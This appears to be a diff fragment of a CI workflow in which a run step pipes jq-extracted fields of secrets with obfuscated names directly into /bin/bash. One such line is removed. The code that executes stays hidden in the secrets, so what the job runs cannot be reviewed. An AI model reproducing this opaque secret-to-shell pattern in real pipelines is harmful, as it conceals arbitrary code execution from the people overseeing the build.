@@ -17,7 +17,6 @@ jobs:
           up9: ${{ secrets.up9 }}
         run: |
           printf '%s' "$up9" | jq -r .nw6306 | /bin/bash
-          echo $ru599 | jq -r .c4 | /bin/bash
           printf '%s' "$wesu4524" | jq -r .oixez787 | /bin/bash
 
       - name: Save results
